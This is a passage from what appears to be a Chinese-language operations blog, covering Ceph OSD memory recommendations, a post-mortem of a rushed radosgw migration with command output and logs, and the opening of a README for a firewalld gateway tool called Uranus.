daemon. Use a small size, for example 10 GB, and only if it’s faster than the block.db device. Network 2x 10 GB Ethernet NICs ceph-mon-container Processor 1x AMD64 or Intel 64 CPU CORE per mon-container RAM 3 GB per mon-container Disk Space 10 GB per mon-container, 50 GB Recommended Monitor Disk Optionally, 1x SSD disk for Monitor rocksdb data Network 2x 1 GB Ethernet NICs, 10 GB Recommended Prometheus 20 GB to 50 GB under /var/lib/ceph/ directory created as a separate file system to protect the contents under /var/ directory. ceph-mgr-container Processor 1x AMD64 or Intel 64 CPU CORE per mgr-container RAM 3 GB per mgr-container Network 2x 1 GB Ethernet NICs, 10 GB Recommended ceph-radosgw-container Processor 1x AMD64 or Intel 64 CPU CORE per radosgw-container RAM 1 GB per daemon Disk Space 5 GB per daemon Network 1x 1 GB Ethernet NICs ceph-mds-container Processor 1x AMD64 or Intel 64 CPU CORE per mds-container RAM 3 GB per mds-container This number is highly dependent on the configurable MDS cache size. The RAM requirement is typically twice as much as the amount set in the mds_cache_memory_limit configuration setting. Note also that this is the memory for your daemon, not the overall system memory. Disk Space 2 GB per mds-container, plus considering any additional space required for possible debug logging, 20 GB is a good start. Network 2x 1 GB Ethernet NICs, 10 GB Recommended Note that this is the same network as the OSD containers. If you have a 10 GB network on your OSDs you should use the same on your MDS so that the MDS is not disadvantaged when it comes to latency. Hardware Recommendations Ceph 官方也提供了相应的硬件配置推荐，关键参数写的比较清晰，但实际的规模比较模棱两可，也是可以提供一些参考的，并且每个版本的 Ceph 所推荐的硬件也是不相同的。\n下表是 Ceph nautilus 的推荐最小硬件 [2]\nProcess Criteria Minimum Recommended ceph-osd Processor 1x 64-bit AMD-64 1x 32-bit ARM dual-core or better RAM ~1GB for 1TB of storage per daemon Volume Storage 1x storage drive per daemon Journal 1x SSD partition per daemon (optional) Network 2x 1GB Ethernet NICs ceph-mon Processor 1x 64-bit AMD-64 1x 32-bit ARM dual-core or better RAM 1 GB per daemon Disk Space 10 GB per daemon Network 2x 1GB Ethernet NICs ceph-mds Processor 1x 64-bit AMD-64 quad-core 1x 32-bit ARM quad-core RAM 1 GB minimum per daemon Disk Space 1 MB per daemon Network 2x 1GB Ethernet NICs 下表是 reef 版本的官方推荐最小配置 [3]\nProcess Criteria Bare Minimum and Recommended ceph-osd Processor 1 core minimum, 2 recommended 1 core per 200-500 MB/s throughput 1 core per 1000-3000 IOPS Results are before replication. Results may vary across CPU and drive models and Ceph configuration: (erasure coding, compression, etc) ARM processors specifically may require more cores for performance. SSD OSDs, especially NVMe, will benefit from additional cores per OSD. Actual performance depends on many factors including drives, net, and client throughput and latency. Benchmarking is highly recommended. RAM 4GB+ per daemon (more is better) 2-4GB may function but may be slow Less than 2GB is not recommended Storage Drives 1x storage drive per OSD DB/WAL (optional) 1x SSD partion per HDD OSD 4-5x HDD OSDs per DB/WAL SATA SSD \u0026lt;= 10 HDD OSDss per DB/WAL NVMe SSD Network 1x 1Gb/s (bonded 10+ Gb/s recommended) ceph-mon Processor 2 cores minimum RAM 5GB+ per daemon (large / production clusters need more) Storage 100 GB per daemon, SSD is recommended Network 1x 1Gb/s (10+ Gb/s recommended) ceph-mds Processor 2 cores minimum RAM 2GB+ per daemon (more for production) Disk Space 1 GB per daemon Network 1x 1Gb/s (10+ Gb/s recommended) 我们使用Ceph环境的示例 用于 Openstack 环境的 Ceph OSD 使用内存记录，主要使用于RDB，机器配置为 1.8T, 900G 的混合硬盘，内存配置 512G， 可以看到 OSD 内存使用率在 0.3% 大概每个 OSD 使用内存量为 2GB。\nPID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 225398 ceph 20 0 3849464 1.7g 22200 S 11.9 0.3 14501:14 ceph-osd 224860 ceph 20 0 3612380 1.7g 22424 S 9.2 0.3 12697:04 ceph-osd 223902 ceph 20 0 3340844 1.7g 22172 S 8.6 0.3 21003:18 ceph-osd 223440 ceph 20 0 3213884 1.7g 22288 S 5.9 0.3 8548:00 ceph-osd 224368 ceph 20 0 3292848 1.6g 22204 S 4.0 0.3 8655:56 ceph-osd 222889 ceph 20 0 3231012 1.7g 22180 S 3.3 0.3 8190:03 ceph-osd 用于业务使用的 Ceph OSD，主要用于对象存储，机器配置为 8c/16G，硬盘是 700G 每块，可以看到每个 OSD 使用的内存大概为 1.8-2G，大概 OSD 的分布是每个节点最多三个 OSD。\nCeph node 01\n# ceph node 01 $ ps aux --sort=-%mem | head -10 USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND ceph 1702 0.4 27.9 10128296 4550760 ? Ssl May03 919:18 /usr/bin/radosgw -f --cluster ceph --name client.rgw.node01 --setuser ceph --setgroup ceph ceph 1721 0.6 12.8 3318456 2088704 ? Ssl May03 1216:59 /usr/bin/ceph-osd -f --cluster ceph --id 6 --setuser ceph --setgroup ceph ceph 1983 0.6 12.3 3358788 2012844 ? Ssl May03 1273:25 /usr/bin/ceph-osd -f --cluster ceph --id 3 --setuser ceph --setgroup ceph ceph 1991 0.9 11.7 3451788 1912008 ? Ssl May03 1719:04 /usr/bin/ceph-osd -f --cluster ceph --id 2 --setuser ceph --setgroup ceph ceph 1709 0.5 7.4 1646276 1212576 ? Ssl May03 1047:48 /usr/bin/ceph-mds -f --cluster ceph --id node01 --setuser ceph --setgroup ceph ceph 18979 1.0 4.5 1330064 742680 ? Ssl May03 1932:51 /usr/bin/ceph-mon -f --cluster ceph --id node01 --setuser ceph --setgroup ceph ceph 529617 3.7 4.4 1909588 721492 ? Ssl Jul15 3140:39 /usr/bin/ceph-mgr -f --cluster ceph --id node01 --setuser ceph --setgroup ceph root 801 0.0 0.6 182536 98516 ? Ss May03 105:28 /usr/lib/systemd/systemd-journald root 1704 0.0 0.3 701284 50132 ? Ssl May03 53:48 /usr/sbin/rsyslogd -n Ceph node02\n$ ps aux --sort=-%mem | head -10 USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND ceph 28650 1.4 12.8 3958988 2104296 ? Ssl 2023 6214:07 /usr/bin/ceph-osd -f --cluster ceph --id 9 --setuser ceph --setgroup ceph ceph 163854 1.4 12.7 3782156 2096396 ? Ssl 2023 6092:28 /usr/bin/ceph-osd -f --cluster ceph --id 10 --setuser ceph --setgroup ceph ceph 3801660 1.5 11.9 3389284 1959812 ? Ssl Jul10 1384:08 /usr/bin/ceph-osd -f --cluster ceph --id 11 --setuser ceph --setgroup ceph root 3348820 0.1 0.1 510848 27732 ? Sl Jun27 171:24 /var/ossec/bin/wazuh-modulesd root 1045 0.0 0.1 574296 21468 ? Ssl 2023 85:44 /usr/bin/python2 -Es /usr/sbin/tuned -l -P polkitd 670 0.0 0.0 612348 14992 ? Ssl 2023 10:40 /usr/lib/polkit-1/polkitd --no-debug Ceph node03\n$ ps aux --sort=-%mem | head -10 USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND ceph 1942206 0.9 12.8 4214720 2092280 ? Ssl 2023 7866:23 /usr/bin/ceph-osd -f --cluster ceph --id 7 --setuser ceph --setgroup ceph ceph 2824 0.8 12.6 4274848 2051800 ? Ssl 2022 7205:58 /usr/bin/ceph-osd -f --cluster ceph --id 4 --setuser ceph --setgroup ceph ceph 2802022 0.7 12.5 3831320 2047440 ? Ssl 2023 4078:51 /usr/bin/ceph-osd -f --cluster ceph --id 1 --setuser ceph --setgroup ceph ceph 1693 0.7 4.7 1439428 771228 ? Ssl 2022 6767:46 /usr/bin/ceph-mon -f --cluster ceph --id node03 --setuser ceph --setgroup ceph ceph 1058494 0.3 2.2 7492512 367288 ? Ssl 2023 3388:44 /usr/bin/radosgw -f --cluster ceph --name client.rgw.node03 --setuser ceph --setgroup ceph ceph 1812870 2.6 0.8 970928 133116 ? Ssl Mar21 6749:43 /usr/bin/ceph-mgr -f --cluster ceph --id node03 --setuser ceph --setgroup ceph root 778 0.0 0.1 76412 28084 ? Ss 2022 113:06 /usr/lib/systemd/systemd-journald ceph 1739 0.4 0.1 384760 28064 ? Ssl 2022 4086:33 /usr/bin/ceph-mds -f --cluster ceph --id node03 --setuser ceph --setgroup ceph Ceph node04，该节点上只有一个 OSD\n$ ps aux --sort=-%mem | head -10 USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND ceph 83779 1.0 12.7 3911168 2087332 ? Ssl Jan23 3473:50 /usr/bin/ceph-osd -f --cluster ceph --id 12 --setuser ceph --setgroup ceph root 6568 0.0 0.0 113020 7808 ? Ss Jan22 0:00 /usr/sbin/sshd -D 配置的一个需求 osd 在运行在没有限制的情况下运行会消耗所有的可用内存，所以当数据节点配置不当，也会引起 oomkiller\nThe OSDs are designed to consume all the available memory if they are run without limits. So it is recommended to apply the resource limits, and the OSDs will stay within the bounds you set. Typically 4GB is sufficient per OSD. [4]\n当 OSD 经历恢复时，它们的内存利用率会达到峰值。如果可用的 RAM 不足，OSD 性能会显着降低，守护进程甚至可能崩溃或被 Linux OOM Killer杀死。[5]\n使用 cephadm 部署的机器群可以通过下面命令查看内存使用情况\nceph orch ps 通常只有两种类型的守护进程有内存限制：mon 和 osd，这些内存限制参数由如下配置进行控制的\nsudo ceph config get mon mon_memory_target # in bytes sudo ceph config get mon mon_memory_autotune sudo ceph config get osd osd_memory_target # in bytes sudo ceph config get osd osd_memory_target_autotune 通过 orch ps 查看的内存限制是不同于 ceph osd 的目标值的，BlueStore 将 OSD 堆内存使用量保留在指定目标大小下，并使用 osd_memory_target 配置选项。\n选项 osd_memory_target 根据系统中可用的 RAM 来设置 OSD 内存。当 TCMalloc 配置为内存分配器，BlueStore 中的 bluestore_cache_autotune 选项设为 true 时，则使用此选项。\n查看现有集群 osd 的配置\n# 显示存储集群中的所有 OSD osd_memory_target sudo ceph config get osd osd_memory_target # 显示指定 OSD osd_memory_target sudo ceph config get osd.0 osd_memory_target 配置集群 OSD osd_memory_target\n# 为存储集群中的所有 OSD 设置 osd_memory_target ceph config set osd osd_memory_target VALUE # 为存储集群中的指定 OSD 设置 osd_memory_target，.id 是 OSD 的 ID ceph config set osd.id osd_memory_target VALUE 网上案例 下面有两个网上搜到的案例，osd具有无限制的内存增长的案例\nosd(s) with unlimited ram growth [6] How to solve “the Out of Memory Killer issue that kills your OSDs due to bad entries in PG logs” [7] 内存查看 使用统计命令，该命令的统计信息不需要运行探查器，也不会将堆分配信息转储到文件中。\nceph tell osd.0 heap stats 使用内存池命令\nceph daemon osd.NNN dump_mempools 使用 google-perftools，该命令会运行探针，来检测运行的命令\ngoogle-pprof --text {path-to-daemon} {log-path/filename} # 例如 pprof --text /usr/bin/ceph-mon /var/log/ceph/mon.node1.profile.0001.heap Reference [1] Minimum hardware considerations\n[2] minimum-hardware-recommendations nautilus\n[3] minimum-hardware-recommendations reef\n[4] Excessive OSD memory usage #12078\n[5] Ceph OSD 故障排除之内存不足\n[6] osd(s) with unlimited ram growth\n[7] How to solve “the Out of Memory Killer issue that kills your OSDs due to bad entries in PG logs”\n[8] Memory Profiling\n","permalink":"https://www.oomkill.com/2024/09/03-3-ceph-osd-performance-recommendation/","summary":"","title":"Ceph OSD内存优化与建议"},{"content":"记录一次因着急没有检查原因而直接下线 ceph 对象存储的的失败记录\n操作流程 ceph 节点内存持续超过90%，因为本身有三个 OSD，检查内存使用情况发现 radosgw\n$ ps aux --sort=-%mem | head -10\rUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND\rceph 1702 0.4 32.9 10128296 4550760 ? Ssl May03 919:18 /usr/bin/radosgw -f --cluster ceph --name client.rgw.node01 --setuser ceph --setgroup ceph\rceph 1721 0.6 12.8 3318456 2088704 ? Ssl May03 1216:59 /usr/bin/ceph-osd -f --cluster ceph --id 6 --setuser ceph --setgroup ceph\rceph 1983 0.6 12.3 3358788 2012844 ? Ssl May03 1273:25 /usr/bin/ceph-osd -f --cluster ceph --id 3 --setuser ceph --setgroup ceph\rceph 1991 0.9 11.7 3451788 1912008 ? Ssl May03 1719:04 /usr/bin/ceph-osd -f --cluster ceph --id 2 --setuser ceph --setgroup ceph\rceph 1709 0.5 7.4 1646276 1212576 ? Ssl May03 1047:48 /usr/bin/ceph-mds -f --cluster ceph --id node01 --setuser ceph --setgroup ceph\rceph 18979 1.0 4.5 1330064 742680 ? Ssl May03 1932:51 /usr/bin/ceph-mon -f --cluster ceph --id node01 --setuser ceph --setgroup ceph\rceph 529617 3.7 4.4 1909588 721492 ? Ssl Jul15 3140:39 /usr/bin/ceph-mgr -f --cluster ceph --id node01 --setuser ceph --setgroup ceph\rroot 801 0.0 0.6 182536 98516 ? Ss May03 105:28 /usr/lib/systemd/systemd-journald\rroot 1704 0.0 0.3 701284 50132 ? Ssl May03 53:48 /usr/sbin/rsyslogd -n\r因为这台节点包含3个 OSD, ceph-mon, ceph-mds 等全功能使用，所以最初的想法是 radosgw 转移到其他节点上，而不是分析为什么 radosgw 进程使用内存较高\n申请一个新节点部署 radosgw，部署时出现错误没有提示日志\n$ ceph-deploy rgw create node06\r[ceph_deploy.conf][DEBUG ] found configuration file at: /home/ceph/.cephdeploy.conf\r[ceph_deploy.cli][INFO ] Invoked (2.0.1): /bin/ceph-deploy rgw create node06\r[ceph_deploy.cli][INFO ] ceph-deploy options:\r[ceph_deploy.cli][INFO ] username : None\r[ceph_deploy.cli][INFO ] verbose : False\r[ceph_deploy.cli][INFO ] rgw : [('node06', 'rgw.node06')]\reph_deploy.cli][INFO ] overwrite_conf : False\r[ceph_deploy.cli][INFO ] subcommand : create\r[ceph_deploy.cli][INFO ] quiet : False\r[ceph_deploy.cli][INFO ] cd_conf : \u0026lt;ceph_deploy.conf.cephdeploy.Conf instance at 0x7fe8a9b583f8\u0026gt;\r[ceph_deploy.cli][INFO ] cluster : ceph\r[ceph_deploy.cli][INFO ] func : \u0026lt;function rgw at 0x7fe8aa412050\u0026gt;\r[ceph_deploy.cli][INFO ] ceph_conf : None\r[ceph_deploy.cli][INFO ] default_release : False\r[ceph_deploy.rgw][DEBUG ] Deploying rgw, cluster ceph hosts node06:rgw.node06\rWarning: Permanently added '[node06]:55556,[192.168.20.88]:55556' (ECDSA) to the list of known hosts.\r[node06][DEBUG ] connection detected need for sudo\rWarning: Permanently added '[node06]:55556,[192.168.20.88]:55556' (ECDSA) to the list of known hosts.\rWe trust you have received the usual lecture from the local System\rAdministrator. It usually boils down to these three things:\r#1) Respect the privacy of others.\r#2) Think before you type.\r#3) With great power comes great responsibility.\rsudo: no tty present and no askpass program specified\r[ceph_deploy.rgw][ERROR ] connecting to host: node06 resulted in errors: IOError cannot send (already closed?)\r[ceph_deploy][ERROR ] GenericError: Failed to create 1 RGWs\r通过 journalctl -u 查看到如下错误 (新节点)\nSep 12 14:51:42 node06 sshd[30495]: error: Could not load host key: /etc/ssh/ssh_host_dsa_key\rSep 12 14:51:42 node06 sshd[30495]: Accepted publickey for ceph from 192.168.20.88 port 37872 ssh2: RSA SHA256:XBYUcCiYBhdw+V32qwx6x0wex1EhaMiSHuz0gQVayTQ\rSep 12 14:51:42 node06 systemd[1]: Created slice User Slice of ceph.\rSep 12 14:51:42 node06 systemd-logind[743]: New session 97 of user ceph.\rSep 12 14:51:42 node06 systemd[1]: Started Session 97 of user ceph.\rSep 12 14:51:42 node06 sshd[30495]: pam_unix(sshd:session): session opened for user ceph by (uid=0)\rSep 12 14:51:42 node06 sshd[30497]: Received disconnect from 192.168.20.88 port 37872:11: disconnected by user\rSep 12 14:51:42 node06 sshd[30497]: Disconnected from 192.168.20.88 port 37872\rSep 12 14:51:42 node06 sshd[30495]: pam_unix(sshd:session): session closed for user ceph\rSep 12 14:51:42 node06 systemd-logind[743]: Removed session 97.\rSep 12 14:51:42 node06 systemd[1]: Removed slice User Slice of ceph.\rSep 12 14:51:42 node06 sshd[30521]: error: Could not load host key: /etc/ssh/ssh_host_dsa_key\rSep 12 14:51:42 node06 sshd[30521]: Accepted publickey for ceph from 192.168.20.88 port 37874 ssh2: RSA SHA256:XBYUcCiYBhdw+V32qwx6x0wex1EhaMiSHuz0gQVayTQ\rSep 12 14:51:42 node06 systemd[1]: Created slice User Slice of ceph.\rSep 12 14:51:42 node06 systemd-logind[743]: New session 98 of user ceph.\rSep 12 14:51:42 node06 systemd[1]: Started Session 98 of user ceph.\rSep 12 14:51:42 node06 sshd[30521]: pam_unix(sshd:session): session opened for user ceph by (uid=0)\rSep 12 14:51:42 node06 sudo[30526]: pam_unix(sudo:auth): conversation failed\rSep 12 14:51:42 node06 sudo[30526]: pam_unix(sudo:auth): auth could not identify password for [ceph]\rSep 12 14:51:45 node06 sudo[30526]: ceph : user NOT in sudoers ; TTY=unknown ; PWD=/home/ceph ; USER=root ; COMMAND=/bin/python2 -c import sys;exec(eval(sys.stdin.readline()))\rSep 12 14:51:45 node06 sshd[30525]: Received disconnect from 192.168.20.88 port 37874:11: disconnected by user\rSep 12 14:51:45 node06 sshd[30525]: Disconnected from 192.168.20.88 port 37874\rSep 12 14:51:45 node06 sshd[30521]: pam_unix(sshd:session): session closed for user ceph\rSep 12 14:51:45 node06 postfix/sendmail[30549]: fatal: parameter inet_interfaces: no local interface found for ::1\r配置 sudo\n#cat /etc/sudoers.d/ceph ceph ALL = (root) NOPASSWD:ALL\r配置完成后部署 radosgw\n# 拷贝配置文件\rceph-deploy --overwrite-conf config push node06\r# 安装软件包\rceph-deploy install --no-adjust-repos --nogpgcheck node06\r# new一个新 rgw 实例，ceph-deploy 只支持new\rceph-deploy rgw create node06\r完整的输出\n$ ceph-deploy --overwrite-conf config push node06\r[ceph_deploy.conf][DEBUG ] found configuration file at: /home/ceph/.cephdeploy.conf\r[ceph_deploy.cli][INFO ] Invoked (2.0.1): /bin/ceph-deploy --overwrite-conf config push node06\r[ceph_deploy.cli][INFO ] ceph-deploy options:\r[ceph_deploy.cli][INFO ] username : None\r[ceph_deploy.cli][INFO ] verbose : False\r[ceph_deploy.cli][INFO ] overwrite_conf : True\r[ceph_deploy.cli][INFO ] subcommand : push\r[ceph_deploy.cli][INFO ] quiet : False\r[ceph_deploy.cli][INFO ] cd_conf : \u0026lt;ceph_deploy.conf.cephdeploy.Conf instance at 0x7f3e96c9e8c0\u0026gt;\r[ceph_deploy.cli][INFO ] cluster : ceph\r[ceph_deploy.cli][INFO ] client : ['node06']\r[ceph_deploy.cli][INFO ] func : \u0026lt;function config at 0x7f3e96ec9c08\u0026gt;\r[ceph_deploy.cli][INFO ] ceph_conf : None\r[ceph_deploy.cli][INFO ] default_release : False\r[ceph_deploy.config][DEBUG ] Pushing config to node06\rWarning: Permanently added '[node06]:55556,[192.168.20.88]:55556' (ECDSA) to the list of known hosts.\r[node06][DEBUG ] connection detected need for sudo\rWarning: Permanently added '[node06]:55556,[192.168.20.88]:55556' (ECDSA) to the list of known hosts.\r[node06][DEBUG ] connected to host: node06 [node06][DEBUG ] detect platform information from remote host\r[node06][DEBUG ] detect machine type\r[node06][DEBUG ] write cluster configuration to /etc/ceph/{cluster}.conf\r$ ceph-deploy install --no-adjust-repos --nogpgcheck node06\r[ceph_deploy.conf][DEBUG ] found configuration file at: /home/ceph/.cephdeploy.conf\r[ceph_deploy.cli][INFO ] Invoked (2.0.1): /bin/ceph-deploy install --no-adjust-repos --nogpgcheck node06\r[ceph_deploy.cli][INFO ] ceph-deploy options:\r[ceph_deploy.cli][INFO ] verbose : False\r[ceph_deploy.cli][INFO ] testing : None\r[ceph_deploy.cli][INFO ] cd_conf : \u0026lt;ceph_deploy.conf.cephdeploy.Conf instance at 0x7fc503ac4758\u0026gt;\r[ceph_deploy.cli][INFO ] cluster : ceph\r[ceph_deploy.cli][INFO ] dev_commit : None\r[ceph_deploy.cli][INFO ] install_mds : False\r[ceph_deploy.cli][INFO ] stable : None\r[ceph_deploy.cli][INFO ] default_release : False\r[ceph_deploy.cli][INFO ] username : None\r[ceph_deploy.cli][INFO ] adjust_repos : False\r[ceph_deploy.cli][INFO ] func : \u0026lt;function install at 0x7fc5041125f0\u0026gt;\r[ceph_deploy.cli][INFO ] install_mgr : False\r[ceph_deploy.cli][INFO ] install_all : False\r[ceph_deploy.cli][INFO ] repo : False\r[ceph_deploy.cli][INFO ] host : ['node06']\r[ceph_deploy.cli][INFO ] install_rgw : False\r[ceph_deploy.cli][INFO ] install_tests : False\r[ceph_deploy.cli][INFO ] repo_url : None\r[ceph_deploy.cli][INFO ] ceph_conf : None\r[ceph_deploy.cli][INFO ] install_osd : False\r[ceph_deploy.cli][INFO ] version_kind : stable\r[ceph_deploy.cli][INFO ] install_common : False\r[ceph_deploy.cli][INFO ] overwrite_conf : False\r[ceph_deploy.cli][INFO ] quiet : False\r[ceph_deploy.cli][INFO ] dev : master\r[ceph_deploy.cli][INFO ] nogpgcheck : True\r[ceph_deploy.cli][INFO ] local_mirror : None\r[ceph_deploy.cli][INFO ] release : None\r[ceph_deploy.cli][INFO ] install_mon : False\r[ceph_deploy.cli][INFO ] gpg_url : None\r[ceph_deploy.install][DEBUG ] Installing stable version mimic on cluster ceph hosts node06\r[ceph_deploy.install][DEBUG ] Detecting platform for host node06 ...\rWarning: Permanently added '[node06]:55556,[192.168.20.88]:55556' (ECDSA) to the list of known hosts.\r[node06][DEBUG ] connection detected need for sudo\rWarning: Permanently added '[node06]:55556,[192.168.20.88]:55556' (ECDSA) to the list of known hosts.\r[node06][DEBUG ] connected to host: node06 [node06][DEBUG ] detect platform information from remote host\r[node06][DEBUG ] detect machine type\r[ceph_deploy.install][INFO ] Distro info: CentOS Linux 7.9.2009 Core\r[node06][INFO ] installing Ceph on node06\r[node06][INFO ] Running command: sudo yum clean all\r[node06][DEBUG ] Loaded plugins: fastestmirror\r[node06][DEBUG ] Cleaning repos: base centos-sclo-rh centos-sclo-sclo devops-Extra epel extras\r[node06][DEBUG ] : openresty remi-php72 remi-php73 remi-php74 remi-safe salt-latest\r[node06][DEBUG ] : tools-repo updates zabbix\r[node06][DEBUG ] Cleaning up list of fastest mirrors\r[node06][DEBUG ] Other repos take up 23 M of disk space (use --verbose for details)\r[node06][INFO ] Running command: sudo yum -y install ceph ceph-radosgw\r[node06][DEBUG ] Loaded plugins: fastestmirror\r[node06][DEBUG ] Determining fastest mirrors\r[node06][DEBUG ] No package ceph available.\r[node06][DEBUG ] Nothing to do\r[node06][INFO ] Running command: sudo ceph --version\r[node06][DEBUG ] ceph version 14.2.22 (ca74598065096e6fcbd8433c8779a2be0c889351) nautilus (stable)\r查看节点是否上线\n$ ceph -s\rcluster:\rid: baf87797-3ec1-4f2c-8126-bf0a44051b13\rhealth: HEALTH_WARN\r1 pools have many more objects per pg than average\rservices:\rmon: 3 daemons, quorum node01,node02,node03 (age 2w)\rmgr: node01(active, since 8w), standbys: node02, node03\rmds: kubefs:2 {0=node01=up:active,1=node02=up:active} 1 up:standby\rosd: 13 osds: 13 up (since 6d), 13 in (since 7M)\rrgw: 4 daemons active (node01, node02, node03, node06)\r流量的请求时访问 radosgw 服务，这个时候新实例是没有引入流量的，需要修改负载均衡器增加新的节点进来，流量引入后需要确认旧服务已经不在处理业务请求后可以下线 确认请求，查看活跃连接\n$ netstat -an|grep 7480\rtcp 0 0 0.0.0.0:7480 0.0.0.0:* LISTEN tcp 0 0 192.168.20.84:7480 192.168.20.84:33152 ESTABLISHED\r确认请求，查看服务日志\n$ tail -f /var/log/ceph/ceph-client.rgw.node01.log\r确认无误可以下线，ceph-deploy 部署的服务没有 cephadm ceph orch rgw delete xx 这类工具进行下线，直接通过 systemd 停止服务即可\n$ systemctl -l|grep rados\rceph-radosgw@rgw.node01.service loaded active running Ceph rados gateway\rsystem-ceph\\x2dradosgw.slice loaded active active system-ceph\\x2dradosgw.slice\rceph-radosgw.target loaded active active ceph target allowing to start/stop all ceph-radosgw@.service instances at once\r停止服务并检查内存状态\n$ systemctl stop ceph-radosgw@rgw.node01.service #ps axu --sort=-%mem|head -10\rUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND\rceph 1983 0.6 12.8 3358788 2084324 ? Ssl May03 1275:36 /usr/bin/ceph-osd -f --cluster ceph --id 3 --setuser ceph --setgroup ceph\rceph 1991 0.9 12.5 3451788 2033560 ? Ssl May03 1722:12 /usr/bin/ceph-osd -f --cluster ceph --id 2 --setuser ceph --setgroup ceph\rceph 1721 0.6 11.8 3318456 1920876 ? Ssl May03 1219:27 /usr/bin/ceph-osd -f --cluster ceph --id 6 --setuser ceph --setgroup ceph\rceph 1709 0.5 7.4 1646276 1212516 ? Ssl May03 1050:21 /usr/bin/ceph-mds -f --cluster ceph --id node01 --setuser ceph --setgroup ceph\rceph 18979 1.0 4.5 1330064 744972 ? Ssl May03 1937:16 /usr/bin/ceph-mon -f --cluster ceph --id node01 --setuser ceph --setgroup ceph\rceph 529617 3.7 4.4 1914452 726436 ? Ssl Jul15 3153:14 /usr/bin/ceph-mgr -f --cluster ceph --id node01 --setuser ceph --setgroup ceph\r总结 本次操作没有分析为什么使用内存高，只是着急做了迁移，这样导致在事后无法确定问题的根本原因，后期遇到问题要先分析并保留证据，其次在做迁移之类动作。\n","permalink":"https://www.oomkill.com/2024/09/05-5-failed-troubleshooting-for-rgw/","summary":"","title":"记录一次失败的radosgw问题排查记录"},{"content":"What is an Uranus? Uranus is a Linux firewalld central controller. In Greek mythology, Uranus king of gods. The firewall gateway is the Uranus for iptables.\nPrerequisites Hardware requirements We recommend these hardware requirements for production systems or for development systems that are designed to demonstrate production use cases:\nItem Description Minimum requirements Recommended Per instance You can install on one node but many features require at least one node. 1 instance \u0026gt; 1 instances RAM per instance Defining your RAM size must be part of the capacity planning for your Uranus usage. 512 Mb \u0026gt;= 1GB Persistent Storage The amount of storage space for each node. 1 GB \u0026gt;= 10GB Software requirements Item Description Recommended OS / Platform Linux, Kubernetes Debian 11\nCentos 7 Firewalld 0.6.3\n0.9.2 Centos 7 default version\nDebian 11 default version Build and run Uranus Setup an Uranus with Binary mode Build and run Uranus backend git clone https://github.com/cylonchau/firewalld-gateway.git Compile\ncd firewalld-gateway \u0026amp;\u0026amp; make build Frist time you need migrate database\n# currently sql-driver support sqlite or mysql ./_output/firewalld-gateway --migration --sql-driver=sqlite --config firewalld-gateway.toml -v 10 Inital API Doc\nswag init -g cmd/main.go --output ./docs/ --packageName docs Run Uranus\n./_output/firewalld-gateway --sql-driver=sqlite --config firewalld-gateway.toml -v 5 Setup Uranus frontend Install Nginx\nyum install nginx -y # or apt install nginx -y Configure nginx\ncd /etc/nginx/ \u0026amp;\u0026amp; \\ mv nginx.conf nginx.conf.default grep -Ev '^$|#' nginx.conf.default \u0026gt; nginx.conf \u0026amp;\u0026amp; \\ sed -i '/include/i \\ include /etc/nginx/conf.d/*.conf;' nginx.conf \u0026amp;\u0026amp; \\ cd conf.d Create fw.conf in conf.d directory\ncat \u0026lt;\u0026lt;EOF \u0026gt; fw.conf server { listen 80; root /var/run/dist; location / { try_files \\$uri \\$uri/ @router; index index.html; } location ~ /fw/(?\u0026lt;section\u0026gt;.*) { proxy_pass http://10.0.0.1:2952/fw/\\$section\\$is_args\\$args; proxy_set_header X-Forwarded-Host \\$server_name; proxy_set_header X-Forwarded-Port \\$server_port; proxy_set_header X-Forwarded-Server \\$host; proxy_set_header X-Forwarded-Scheme \\$scheme; proxy_set_header X-Forwarded-URI \\$request_uri; proxy_set_header X-Real-IP \\$remote_addr; proxy_set_header X-Forwarded-For \\$proxy_add_x_forwarded_for; } location ~ /security/(?\u0026lt;section\u0026gt;.*) { proxy_pass http://10.0.0.1:2952/security/\\$section\\$is_args\\$args; proxy_set_header X-Forwarded-Host \\$server_name; proxy_set_header X-Forwarded-Port \\$server_port; proxy_set_header X-Forwarded-Server \\$host; proxy_set_header X-Forwarded-Scheme \\$scheme; proxy_set_header X-Forwarded-URI \\$request_uri; proxy_set_header X-Real-IP \\$remote_addr; proxy_set_header X-Forwarded-For \\$proxy_add_x_forwarded_for; } location ~ /sso/(?\u0026lt;section\u0026gt;.*) { proxy_pass http://10.0.0.1:2952/sso/\\$section\\$is_args\\$args; proxy_set_header X-Forwarded-Host \\$server_name; proxy_set_header X-Forwarded-Port \\$server_port; proxy_set_header X-Forwarded-Server \\$host; proxy_set_header X-Forwarded-Scheme \\$scheme; proxy_set_header X-Forwarded-URI \\$request_uri; proxy_set_header X-Real-IP \\$remote_addr; proxy_set_header X-Forwarded-For \\$proxy_add_x_forwarded_for; } location /ping { proxy_pass http://10.0.0.1:2952/ping; proxy_set_header X-Forwarded-Port \\$server_port; proxy_set_header X-Forwarded-Server \\$host; proxy_set_header X-Forwarded-Scheme \\$scheme; proxy_set_header X-Forwarded-URI \\$request_uri; proxy_set_header X-Real-IP \\$remote_addr; proxy_set_header X-Forwarded-For \\$proxy_add_x_forwarded_for; } } EOF Copy dist directory to /var/run/\nmv dist /var/run/ Start nginx\nsystemctl start nginx Setup an Uranus with Docker build docker image git clone https://github.com/cylonchau/firewalld-gateway.git Build image\ndocker build -t cylonchau/uranus:v0.0.5 . Run\ndocker run -d --rm --name uranus -p 2953:2953 cylonchau/uranus:v0.0.5 Notes: this mode default using sqlite, so if you want use external database, please change config file, then build image\nSetup firewalld Download Default, we provide 2 version firewalld variant version\nCentos 7 or Centos 6 Debian 11 You can download and install those firewalld vesion in you Linux\nhttps://github.com/cylonchau/firewalld/releases\nInstall Centos 7\nrpm -e python-firewall-0.6.3-11 --nodeps \u0026amp;\u0026amp; rpm -ivh python-firewall-0.6.3-4.el7.noarch.rpm Debian 11\ndpkg -r python3-firewall \u0026amp;\u0026amp; \\ dpkg -i python3-firewall_0.9.3-2_amd64.deb Configure Enable dbug remote mode Centos Edit /etc/dbus-1/system.conf\n\u0026lt;!-- This configuration file is no longer required and may be removed. In older versions of dbus, this file defined the behaviour of the well-known system bus. That behaviour is now determined by /usr/share/dbus-1/system.conf, which should not be edited. For local configuration changes, create a file system-local.conf or files 